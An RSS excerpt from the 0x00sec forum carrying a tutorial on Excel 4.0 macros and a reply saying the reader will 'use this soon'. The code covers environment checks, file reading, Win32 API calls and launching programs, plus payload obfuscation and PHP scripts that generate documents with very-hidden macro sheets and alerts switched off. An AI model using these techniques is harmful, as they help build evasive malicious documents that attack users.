        <source url="https://0x00sec.org/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
      </item>
      <item>
        <title>Excel | Primi passi</title>
        <dc:creator><![CDATA[Danus]]></dc:creator>
        <description><![CDATA[
            <p>I love this! Amazing article! I’ll sure use this soon <img src="https://0x00sec.org/images/emoji/twitter/smiling_imp.png?v=9" title=":smiling_imp:" class="emoji" alt=":smiling_imp:"></p>
          <p><a href="https://0x00sec.org/t/excel-primi-passi/20458/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/excel-primi-passi/20458/3</link>
        <pubDate>Sun, 12 Apr 2020 19:20:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20458-3</guid>
        <source url="https://0x00sec.org/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
      </item>
      <item>
        <title>Excel | Primi passi</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<h1>Introduction</h1>
<p><em>“I believe in the existence within myself of a power.<br>
From this belief derives my will to exert it.”</em></p>
<p>I’ve always considered practice a <em>golden key</em> to further comprehend a given subject.<br>
Experimentation expands theory and stimulates creativity, as there is virtually no limit to what could be learnt or done.</p>
<h2>Excel - Basics</h2>
<p>In Excel, the initial file on which the user operates is called a <em>Workbook</em> that initially is composed of <em>three Worksheets</em> as seen below:</p>
<p><span alt="image" data-base62-sha1="wnyptkYgfnWetONdtWiJhmtMQ4G" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Each <em>single sheet</em> consists of <em>alphabetic columns</em> and <em>numeric rows</em>, with the <em>selected cell</em> name indicated in an <em>Edit control</em> <strong>above</strong> (e.g.: <em>B2</em>):</p>
<p><span alt="image" data-base62-sha1="4wH8Qa3XygwQBrrArlzDxQLBh1n" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The user has the possibility to automate calculations in a Worksheet by using <em>Formulas</em>. Once defined they can easily applied to other <em>adjacent cells</em> as well:<br>
<span alt="image" data-base62-sha1="bpjsdQ3lJ0NVJGfQV1kqUzF4mB0" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p><span alt="image" data-base62-sha1="51LmBJm9qKZ4CzpzTWvQwuvnbrj" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p><span alt="image" data-base62-sha1="rchnd9QgZVI3v0pm760TwB5gmSQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Furthermore, <em>multiple functions</em> are provided for logical operations such as an <code>IF</code> case:</p>
<p><span alt="image" data-base62-sha1="hqRVKgd4rj3mJHL9CWTANeVLmH5" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This translates to:</p>
<pre><code class="lang-auto">=IF(OR(A1&lt;A2; FALSE); 1; 0)
</code></pre>
<h2>Macros</h2>
<p><em>Macros</em> are declarations of one to several procedures, which either have a return-value, in which case they are considered a <em>Function</em> or  in case they do not have one they are labeled as a <em>Sub</em>.<br>
Excel also comes with a <em>Visual Basic Editor</em> that is efficient for real-time creation and testing of Macros.<br>
By default it can be invoked using the Hotkey <em>ALT+F11</em> and looks like this:</p>
<p><span alt="image" data-base62-sha1="2YDoN0evf62IdNQMYEbzhcYIU5r" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
In case of us adding macros the file extensions will have to be either <em>XLS</em> or <em>XLSM</em> to support these macros:<br>
<span alt="image" data-base62-sha1="nnLsRMRAvHmBXq3mFH4EUBDL6Px" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="93Ksf3wYhfz0JWIaVPGIaMW4FZB" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Similarly a new icon already displays mistrust towards XLSM files du to macros being able to cause harm without a user actively knowing…<br>
Additionally, when these file with macros are opened, a <em>security warning</em> is displayed to raise awareness of <em>potential risks</em>, and asks if the user consents to enable the macros.<br>
<span alt="image" data-base62-sha1="a9R3cyuucqTO4T5T2cDttlS1GuB" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="61Txgi2dGuHfPgccENelYxbiOVJ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This certainly should not be done unless <em>our document have been thoroughly analysed</em>.</p>
<h3>Macros - XL4 Edition</h3>
<p>XL4 are considered legacy macros that are still supported in newer Excel versions.<br>
Their powerful nature allows them to perform multiple actions.<br>
They can be executed either by:</p>
<ul>
<li>using <em>VBA’s</em> ExecuteExcel4Macro, or<br>
<span alt="image" data-base62-sha1="7rEP1mRwoqATWex5n3WoMY4NaNF" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
<li>inserting <em>a seperate Excel 4.0 module</em>.<br>
<span alt="image" data-base62-sha1="4dF6csRYj1lwk5ble2t2q0WSy6S" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>  <span alt="image" data-base62-sha1="jMdCJId7YEF7AFnJ5ucQELv0s4C" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
</ul>
<h4>Running and debugging an Excel 4.0 macro:</h4>
<p>In case we have inserted a macro in our Excel sheet like seen below we can execute and debug it a follows.</p>
<ol>
<li>First we select <em>execute</em> from the context menu<br>
<span alt="image" data-base62-sha1="hJVLTFlFYMTga85dxPbo4lq9tKm" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
<li>Then we select which cell (==name) to execute<br>
<span alt="image" data-base62-sha1="aHlqJ3CaNAekyogiwCV7TzZ5pW6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
<li>Finally we have to confirm out choices and are good to go!<br>
<span alt="image" data-base62-sha1="9MaMKMusc3G0IO7aG2VBHx5kusi" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
In our case a simple message will be displayed when upon completion:<br>
<span alt="image" data-base62-sha1="m2k7YkdYpriNRe8G8pudajyrxU2" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
</ol>
<h4>Macros - Demonstrating advanced funcionality</h4>
<ul>
<li>
<p><strong>Identifying the current runtime environment</strong>:<br>
For this test we need a mix of <code>SET.NAME</code>, <code>GET.WORKSPACE</code> and and <code>IF</code> condition.<br>
The function <code>GET.WORKSPACE</code> requires a <code>Type_num</code> integer, which specifies the information to be retrieved.<br>
<span alt="image" data-base62-sha1="3TrcAOnx3juOPv9t7ugz6ebAD4T" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
<code>SET.NAME</code> assigns its return-value to a variable called <code>ENV</code>, It is then instructed using the <code>IF</code> to <code>QUIT</code> if it cannot not <code>FIND</code> (case-sensitive) <em>Windows</em> in <code>ENV</code>.<br>
Additionally, functions like <code>SEARCH</code>, or <code>GOTO</code> to redirect execution to a specific cell can be used aswell.<br>
This full macro looks like this:</p>
<pre><code class="lang-auto"> =SET.NAME("ENV", GET.WORKSPACE(1))
=IF(FIND("Windows", ENV), ALERT(ENV), QUIT())
=HALT()
</code></pre>
<p><span alt="image" data-base62-sha1="71Ncq0mw4nWUkwuhtfwLOc3EFKp" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
</li>
</ul>
<hr>
<ul>
<li>
<p><strong>Reading one or multiple files:</strong><br>
Even from within Excel we can access files on disks. In this setup we have a folder and two files as follows:<br>
<span alt="image" data-base62-sha1="gDeXq89O43tiUbp7zgsupQA4xo8" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
<span alt="image" data-base62-sha1="8JeK6Xkut5Rajsg08p7N1JRtVmo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can traverse directories with the <code>DIRECTORY</code> function before obtaining a directorys file list with <code>FILES</code>, which returns an array.<br>
In our case this is: <code>{"111.", "222."}</code>.<br>
We can access files with <code>FOPEN</code>, which takes an index from a file list array and a mode:<br>
<span alt="image" data-base62-sha1="pCeHivwhnjA0kGI24mVEDtZoXx6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can continue to read the contents with <code>FREADLN</code> until <em>EOF</em> is hit.<br>
For some entertainment we can utilize the <code>BEEP</code> call, which simply emits a sound <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">.</p>
<pre><code class="lang-auto">=BEEP()
=DIRECTORY("C:\000\")
=SET.NAME("FLIST", FILES())
=FOR("IDX", 1, COLUMNS(FLIST))
=SET.NAME("FNUM", FOPEN(INDEX(FLIST, IDX), 2))
=WHILE(NOT(FPOS(FNUM) &gt; FSIZE(FNUM)))
=ALERT("L~: " &amp; FREADLN(FNUM))
=NEXT()
=FCLOSE(FNUM)
=NEXT()
=HALT()
</code></pre>
<p><span alt="image" data-base62-sha1="8u69UzTPdKzH1gHHqzGNg50WJDy" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>  <span alt="image" data-base62-sha1="fNZSL7X0NoC8nnitQ7ybR8VceHi" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
</li>
</ul>
<hr>
<ul>
<li>
<p><strong>Calling external functions</strong>:<br>
We can also invoke external functionality from the Win API, because why not!<br>
For example we can <code>REGISTER</code> the function <code>user32!SwapMouseButton</code> with <em>“AA”</em> as its <a href="https://support.office.com/en-us/article/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f#__toc309221612" rel="nofollow noopener"><em>type_value</em></a>.<br>
It reverses or restores the role of the left and right mouse buttons:</p>
<p><span alt="image" data-base62-sha1="luNMOFiQjRef8I6z1eWXVAtgeFq" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="64fu0plG6n2YiC1N8l9SM6hDaA1" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We have to use a <code>CALL</code> to invoke the cell which was used to <code>REGISTER</code> the function.<br>
<code>GET.WORKSPACE</code> with argument 44 is able to extract the location of the loaded DLL.<br>
<span alt="image" data-base62-sha1="wm9y1urVNa6YGCDG5fJ49n2Ck7L" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Putting that all together with the knowledge from the prior examples leaves us with the following macro code:</p>
<pre><code class="lang-auto">=REGISTER("user32", "SwapMouseButton", "AA")
=ALERT("Library at " &amp; GET.WORKSPACE(44), 3)
=CALL(A1, TRUE)
=UNREGISTER(A1)
=HALT()
</code></pre>
<p>When finished it yields:<br>
<span alt="image" data-base62-sha1="nmAZRpvyzGsGosMWAPqSPctB4bG" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
And <em>mouse buttons have been indeed swapped</em>!</p>
</li>
</ul>
<hr>
<ul>
<li>
<strong>Executing binaries on the FS:</strong><br>
So far this was all just for fun and some file system enumeration but binaries can be executed from within excel as well.<br>
For example we can spawn the calculator by calling <code>EXEC</code> with one of the following arguments:<br>
<span alt="image" data-base62-sha1="lW3rtQiiR4zf3zGJ7oApezKXNsW" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><pre><code class="lang-auto">=EXEC("CALC", 1)
=HALT()
</code></pre>
Alternatively, we can also simulate key presses by using <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.application.sendkeys" rel="nofollow noopener">KEYS.SEND</a>.<br>
However, it’ll be slower, since there has to be a small timeout delay of abour 2~4 seconds for some reason before the process can run:<br>
<span alt="image" data-base62-sha1="oNn4F0ySonTnutFREsLMb7DFQIw" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><pre><code class="lang-auto">=EXEC("CMD", 2)
=WAIT(NOW() + "00:00:02")
=SEND.KEYS("CALC~", TRUE)
=HALT()
</code></pre>
As a second example I’ll show that a call to <code>ShellExecuteA</code> is also feasible…<br>
<span alt="image" data-base62-sha1="1kgEieBvococ6NBT3eqokXtqpKt" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We define the following arguments:
<ul>
<li>hwnd = -1(J(Int)),</li>
<li>lpFile = “CALC”(C(Char *))</li>
<li>nShowCmd = 5(H(UInt16_t))</li>
<li>remaining is to be ignored with 0(J(Int)).*</li>
</ul>
<pre><code class="lang-auto">=CALL("shell32", "ShellExecuteA", "JJJCJJH", -1, 0, "CALC", 0, 0, 5)
=HALT()
</code></pre>
Again, an alternative to that can be using <code>INITIATE</code> that prepares a DDE channel with an arbitrary application, except this method warns the user!<pre><code class="lang-auto">=INITIATE("CALC", 0)
</code></pre>
<span alt="image" data-base62-sha1="zYYhBB0jnORurrCcOftS0yu7bA2" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="t6MO23ygvqDpTFEmCjaUxXAz5IH" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
</ul>
<hr>
<ul>
<li>
<p><strong>Obsfucation</strong>:<br>
A cell’s <code>FORMULA</code> can be overwritten, consequently, the payload can be concealed.<br>
If A1 pre-execution contains:</p>
<pre><code class="lang-auto">=FORMULA("=EXEC(""CALC"")", A2)
</code></pre>
<p>On execution, A2 will be populated with the result, and executed right after.</p>
<pre><code class="lang-auto">=EXEC("CALC")
</code></pre>
<p>Another technique is using <code>EVALUATE</code>:</p>
<pre><code class="lang-auto">=ALERT(EVALUATE(CHAR(61) &amp; CHAR(70) &amp; CHAR(105) &amp; CHAR(108) &amp; CHAR(101) &amp; CHAR(115) &amp; CHAR(40) &amp; CHAR(41)))
</code></pre>
<p>Once we execute this we get the following:<br>
<span alt="image" data-base62-sha1="jyiBsDoXt863Bt0jJD4oG0ATuBt" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
To fine tune this obfuscation technique we can use <a class="mention" href="https://0x00sec.org/u/emparetiw_aparajdm">@Emparetiw_Aparajdm</a>’s method for <a href="https://0x00sec.org/t/continued-fraction-data-encoding/3108"><em>Continued Fraction Data Encoding</em></a>!<br>
His suggestion is to concatenate ASCII codes in order to form a nominator.<br>
The <em>key denominator</em> is to be randomly generated.<br>
The <em>decimal codes</em> need to be padded(<code>3</code>) to ensure information sufficiency:<br>
<span alt="fract" data-base62-sha1="fnUeqGkVzWucNZ5cwJ87WZTawez" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Here the <code>x</code> being the result of the devision <code>u/v</code>.<br>
For example by using this method the string <em>“=EX”</em> can be encoded as <em>061069088</em>.<br>
The following PHP script implements this exact behavior:</p>
<pre><code class="lang-php">&lt;?php
$u = 61069088;
$v = 41758269584;
$e = [];

while(($r = $u % $v) != 0)
{
	$a = intval($u / $v);
	$u = $v;
	$v = $r;
	array_push($e, $a);
}

var_dump($e);
?&gt;
</code></pre>
<p>The script yields the following result:<br>
<span alt="image" data-base62-sha1="m0V3Abou5SYC0e4vVGpRNZSQTe7" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
That chain of <code>a0, a1, a2, .., a17</code> can be used to reverse the process, multiplied by <em>v</em> will yield <em>u</em>.<br>
The obtained array is to be reversed(<code>array_reverse</code>) and stored in an Excel row.<br>
In another row, the denominator(aka <em>key</em>) will be stored.<br>
<span alt="image" data-base62-sha1="gmhJeSx3s0r0RIqFTlKzmbNYe8r" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Reversing it is easily done with the following macro:</p>
<pre><code class="lang-auto">=SET.NAME("P", 0)
=FOR.CELL("N", A1:A18, FALSE)
=SET.NAME("P", (P + N) ^ -1)
=NEXT()
=SET.VALUE(B2, TEXT(CEILING((P ^ -1) * B1, 1), REPT(CHAR(48), 3*3)))
=ALERT(B2)
=FOR("H", 0, 2)
=SET.VALUE(B3, B3 &amp; CHAR(MID(B2, H*3 + 1, 3)))
=NEXT()
=ALERT(B3)
=HALT()
</code></pre>
<p><span alt="image" data-base62-sha1="7OT8zsnUE6DPb1JMGCZNdKrSB5T" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> <span alt="image" data-base62-sha1="iw3FCo5pEgZbB7qFGvDKdfD3fss" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p><a href="http://www.44lbs.net/ilia/Excel4macro.zip" rel="nofollow noopener">Excel 4.0 Functions</a></p>
</li>
</ul>
<h3>Automatic malicious-document generation</h3>
<p><em>“For the seeker of truth nothing takes precedence over the truth,<br>
and there is no disparagement of the truth,<br>
nor belittling either of him who speaks it or of him who conveys it.”</em></p>
<p>My local test environment had XAMPP already installed, a slight modification of its <em>php.ini</em> allows us to use <em>COM</em> extensions:<br>
<span alt="image" data-base62-sha1="zotTIsO6oU4YUGacv1lttgcyWD3" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Additionally, us allowing  <a href="https://support.microsoft.com/en-us/help/282830/programmatic-access-to-office-vba-project-is-denied" rel="nofollow noopener">VBProject modification programmatically</a> is also required.<br>
<span alt="image" data-base62-sha1="82yKzZ2QAw3qWHpBbJR0UzopVRo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Now, pretty much everything can be done with the <a href="https://docs.microsoft.com/en-us/visualstudio/vsto/excel-object-model-overview?view=vs-2019" rel="nofollow noopener">Excel object model</a>…<br>
From spawning <code>EXCEL.EXE</code> to creating an entire document that fits our needs!<br>
I’ll be using  <strong>OleView .NET</strong> to explore registered <em>COM objects</em>.<br>
It makes our life a lot easier!<br>
We can start by doing:<br>
<span alt="image" data-base62-sha1="6im6nfCEOOyr6j7Zm5o3TWqbdNT" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="npVj1eWQ3t7pfjZD7K90y9XLYlp" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
<em>Members</em> of a COM object can be identified by fetching the <em>Typelib</em>.<br>
For that purpose, PHP provides a function called <code>com_print_typeinfo</code>.<br>
<span alt="image" data-base62-sha1="sioRfJSEOX9Dad2d0FxpBgoOQR4" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can use it as follows:</p>
<pre><code class="lang-php">$XL = new COM('Excel.Application') or die(0);
com_print_typeinfo($XL);
</code></pre>
<p>The result is a whole page of all the Elements of our XL object.<br>
All these properties can be used to tweak the nature of the document that we’re about to create<br>
We’ll start by looking at three important ones of different nature.</p>
<p><span alt="image" data-base62-sha1="kQVE2iefA6krhReAq3kmF62u0x6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.application.visible" rel="nofollow noopener">first property</a> allows to get or set the state of the window visibility.<br>
The second is a collection of all open <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.workbooks" rel="nofollow noopener">Workbooks</a>.<br>
The third is a method, and it simply <em>terminates the process</em>.<br>
Putting that knowledge to use in our PHP script:</p>
<pre><code class="lang-php">$XL-&gt;Visible = TRUE;
$WB = $XL-&gt;Workbooks;
com_print_typeinfo($WB);
Sleep(60);
$XL-&gt;Quit();
</code></pre>
<p>When executed Excel becomes visible in the taskbar, which is essential for debugging.<br>
<span alt="image" data-base62-sha1="xlGScW048Gxyi2MDZaGCdRP41pi" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
However we’re just greeted with the following Excel window…<br>
This does not seem quite useful for now.<br>
<span alt="image" data-base62-sha1="wWqpbKeUykvB4Gqr50ymWPOo7pE" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This beehavior occurs, because initially the Workbooks count is 0, hence the Excel window is empty.<br>
<span alt="image" data-base62-sha1="2E6u4O33PHZT9KnqqTuhX48WCJh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-auto">printf("Count: %d", $XL-&gt;Workbooks-&gt;Count);
$WB = $XL-&gt;Workbooks-&gt;Add();
</code></pre>
<p><span alt="image" data-base62-sha1="qkPrqL9uPrD94u113xVzZOzOkjf" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
To add one, we must use <code>Workbooks.Add()</code>, the returned object is the new Workbook.<br>
<span alt="image" data-base62-sha1="hucwtOB7G8XGITYnKjtU8zeKv2Z" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The workbook by default holds <code>$XL-&gt;SheetsInNewWorkbook</code>(3) worksheets.<br>
This corresponds to the usual <code>Sheet1, Sheet2, Sheet3</code><br>
The amount of workbooks is stored in an object called <em>Worksheets</em>…<br>
<span alt="image" data-base62-sha1="ihnQ6JLoAWkeA0NWw7tc5wQaWVW" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The same Excel object reference list also offers the <em>SaveAs</em> function with all meta data fields we can set by hand when using the GUI…:</p>
<pre><code class="lang-auto">/* DISPID=1925 */ function SaveAs(
/* VT_VARIANT [12] [in] */ $Filename, /* VT_VARIANT [12] [in] */ $FileFormat,
/* VT_VARIANT [12] [in] */ $Password, /* VT_VARIANT [12] [in] */ $WriteResPassword,
/* VT_VARIANT [12] [in] */ $ReadOnlyRecommended, /* VT_VARIANT [12] [in] */ $CreateBackup,
/* ? [29] [in] */ $AccessMode, /* VT_VARIANT [12] [in] */ $ConflictResolution,
/* VT_VARIANT [12] [in] */ $AddToMru, /* VT_VARIANT [12] [in] */ $TextCodepage,
/* VT_VARIANT [12] [in] */ $TextVisualLayout, /* VT_VARIANT [12] [in] */ $Local ) { }
</code></pre>
<p>All the supported file extensions by Excel are stored in an enum called <em>XlFileFormat</em>, which is described in detail over @ <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.xlfileformat" rel="nofollow noopener">MSDN</a>.</p>
<p>Anyhow, back to the worksheets object and its <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.worksheets.add" rel="nofollow noopener"><code>Add() method</code></a>:</p>
<pre><code class="lang-auto">/* DISPID=181 */ /* VT_DISPATCH [9] */ function Add(
/* VT_VARIANT [12] [in] */ $Before, /* VT_VARIANT [12] [in] */ $After,
/* VT_VARIANT [12] [in] */ $Count, /* VT_VARIANT [12] [in] */ $Type) { }
</code></pre>
<p><span alt="image" data-base62-sha1="tYcThRBmIa7uT37APiZqUL0Arsk" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This shows that we can create an XL4 sheet if we pass <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.xlsheettype" rel="nofollow noopener"><code>xlExcel4IntlMacroSheet</code></a>(4) as the type.<br>
<code>Excel4IntlMacroSheets.Add() method</code> accomplishes the same task, but does not require any arguments:<br>
<span alt="image" data-base62-sha1="9ZcMEYcV7hBrhHRkuSm4XdMICnV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
When putting that knowledge to use in our PHP script as follows:</p>
<pre><code class="lang-php">define('xlExcel4IntlMacroSheet', 4);
$M1 = $WB-&gt;Worksheets-&gt;Add(NULL, NULL, 1, xlExcel4IntlMacroSheet);
$M2 = $XL-&gt;Excel4IntlMacroSheets-&gt;Add();
</code></pre>
<p>We get validation of our done research in form of:<br>
<span alt="image" data-base62-sha1="lVGpea26Eon5uQ9FcL7uy01K1AQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Two new XL4 macro sheets were successfully created.<br>
Now, due to the new changes Excel refuses to just exit and asks if we’d like to save the file.<br>
We can luckily remove this feature by modifying the boolean value of <code>Application.DisplayAlerts</code> and set it to <em>FALSE</em>:<br>
<span alt="image" data-base62-sha1="8BxWddLqjzv0LyuOLWfGun1XC9O" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-php">$XL-&gt;DisplayAlerts = FALSE;
</code></pre>
<p>Manipulating a worksheet’s content is the next thing for us to do!</p>
<pre><code class="lang-php">com_print_typeinfo($M1);
</code></pre>
<p><span alt="image" data-base62-sha1="xcLSq9f9Nh7lTrMJrNtKYINclZw" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
For example we can tweak the <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.worksheet.visible" rel="nofollow noopener">Visible</a> element in three possible ways:<br>
<code>{xlSheetVisible(-1), xlSheetHidden(0), xlSheetVeryHidden(2)}</code>.</p>
<pre><code class="lang-php">define('xlSheetHidden', 0);
define('xlSheetVeryHidden', 2);
$M1-&gt;Visible = xlSheetHidden;
$M2-&gt;Visible = xlSheetVeryHidden;
</code></pre>
<p><span alt="image" data-base62-sha1="sBKTm84a7qhQfWGXPAqsOfE8rUL" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="lUkGJbGa9pQ6uYOnz3vcKWhBuf" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This results in the two added sheets being hidden.<br>
However, <code>$M1</code> can still be made visible by a normal user.<br>
Some more interesting cell property elements:<br>
<span alt="image" data-base62-sha1="5AMXcRXDn3SXpiKyxbPyPLt2apF" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The value of a cell can hold plain text (e.g.: AAABBBC) or a result (e.g.: 8, the SUM of A1;A2) of a formula.<br>
